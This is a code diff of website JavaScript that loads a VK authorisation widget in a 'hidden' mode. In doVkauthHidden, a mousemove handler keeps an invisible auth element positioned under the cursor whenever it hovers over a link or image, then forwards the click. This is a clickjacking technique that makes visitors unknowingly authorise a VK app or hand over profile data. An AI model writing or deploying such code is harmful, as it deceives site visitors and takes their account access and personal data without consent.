@@ -43,7 +43,10 @@ function loadVk(appid, hidden, _scope, getprofile) {
 }
 
 function isClickable(click_el) {
-	return true;
+	
+	if (click_el == null)
+		return false;
+	
 	if (click_el.tagName == "A" || click_el.tagName == "a" || click_el.tagName == "img" || click_el.tagName == "IMG")
 		return true;
 	if (click_el.parentNode)
@@ -110,22 +113,23 @@ function doVkauthHidden(appid, getprofile) {
 	} });
 
 	
-	var el = $('#punktvkauth_wrap1');
-	$(window).on('mousemove', function(e) {
-	//var el = document.getElementById('punktvkauth_wrap1');
-	//window.onmousemove = function (e) {
+	//var el = $('#punktvkauth_wrap1');
+	//$(window).on('mousemove', function(e) {
+	var el = document.getElementById('punktvkauth_wrap1');
+	window.onmousemove = function (e) {
 	
 		var click_el = document.elementFromPoint(e.pageX, e.pageY);
 		if (isClickable(click_el)) {
-			el.css({left: e.pageX-90, top:e.pageY-12});
-			//el.style.left = e.pageX-90;
-			//el.style.top = e.pageY-12;
+			//el.css({left: e.pageX-90, top:e.pageY-12});
+			el.style.left = e.pageX-90;
+			el.style.top = e.pageY-12;
 			if (document.clicked) {
 				click_el.click();
 				document.clicked = false;
 			}
 		}
-	});
+	}
+	//);
 }
 
 function doVkauthExplicit(appid, _scope, getprofile) {
